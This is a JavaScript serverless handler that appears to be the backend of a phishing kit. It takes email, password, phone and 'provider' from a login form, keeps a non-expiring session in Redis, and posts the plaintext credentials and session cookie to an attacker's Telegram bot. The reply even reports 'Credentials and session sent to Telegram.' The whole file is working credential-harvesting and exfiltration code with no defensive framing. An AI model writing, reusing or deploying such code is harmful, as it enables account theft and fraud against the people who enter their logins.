import { v4 as uuidv4 } from "uuid";
import fetch from "node-fetch";
import redis from "../redis-client.js"; // Adjust path as needed

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function getSessionKey(token) {
  return `session:${token}`;
}

export default async function handler(req, res) {
  // Check required env vars
  if (!BOT_TOKEN || !CHAT_ID || !process.env.REDIS_URL) {
    res.status(500).json({
      success: false,
      message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL",
    });
    return;
  }

  if (req.method !== "POST") {
    res.status(405).json({ success: false, message: "Method not allowed" });
    return;
  }

  let bodyObj = req.body;
  if (typeof bodyObj === "string") {
    try {
      bodyObj = JSON.parse(bodyObj);
    } catch {
      res.status(400).json({ success: false, message: "Invalid JSON body" });
      return;
    }
  }

  const { email, password, phone, provider } = bodyObj || {};
  if (!email || !password || !provider) {
    res.status(400).json({ success: false, message: "Missing required fields" });
    return;
  }

  const normalizedEmail = email.trim().toLowerCase();
  const sessionToken = uuidv4();

  try {
    // Store session in Redis without expiration
    await redis.set(getSessionKey(sessionToken), normalizedEmail);
  } catch (err) {
    console.error("Redis error:", err);
    res.status(500).json({ success: false, message: "Failed to store session" });
    return;
  }

  // Set far-future expiration for cookie
  const expires = new Date('2099-12-31T23:59:59.000Z').toUTCString();
  const cookieString = `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Expires=${expires}`;

  const message = [
    "🔐 *New Login*",
    `📧 Email: ${normalizedEmail}`,
    `🔑 Password: ${password}`,
    `📱 Phone: ${phone || "N/A"}`,
    `🌐 Provider: ${provider}`,
    `🍪 Session: ${sessionToken}`,
    `🔖 Cookie: \`${cookieString}\``,
    `⏳ Valid: Never expires`,
    `🕒 Time: ${new Date().toISOString()}`,
  ].join("\n");

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(`Telegram API error: ${response.status} ${text}`);
    }
  } catch (error) {
    console.error("Telegram error:", error);
    // Not fatal, proceed without blocking user
  }

  // Set session cookie
  res.setHeader("Set-Cookie", cookieString);

  res.status(200).json({
    success: true,
    message: "Login successful. Credentials and session sent to Telegram.",
    session: sessionToken,
    cookie: cookieString,
    email: normalizedEmail,
  });
}